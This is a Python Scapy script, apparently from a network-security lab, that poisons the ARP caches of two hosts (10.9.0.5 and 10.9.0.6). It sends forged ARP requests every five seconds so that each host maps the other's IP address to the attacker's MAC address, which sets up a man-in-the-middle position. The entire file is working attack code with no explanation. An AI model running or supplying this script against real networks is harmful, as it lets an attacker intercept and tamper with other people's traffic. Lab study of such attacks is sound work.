#!/usr/bin/env python3
from scapy.all import *
import time

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"

IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

IP_M = "10.9.0.105"
MAC_M = get_if_hwaddr("eth0")

while True:
    # Poison A's cache: Tell A that B is at M's MAC
    ether_to_A = Ether(src=MAC_M, dst=MAC_A)
    arp_to_A = ARP(psrc=IP_B, hwsrc=MAC_M, pdst=IP_A, hwdst=MAC_A)
    arp_to_A.op = 1
    frame_to_A = ether_to_A/arp_to_A
    
    # Poison B's cache: Tell B that A is at M's MAC
    ether_to_B = Ether(src=MAC_M, dst=MAC_B)
    arp_to_B = ARP(psrc=IP_A, hwsrc=MAC_M, pdst=IP_B, hwdst=MAC_B)
    arp_to_B.op = 1
    frame_to_B = ether_to_B/arp_to_B
    
    # Send both packets
    sendp(frame_to_A, iface="eth0", verbose=False)
    sendp(frame_to_B, iface="eth0", verbose=False)
    
    time.sleep(5)
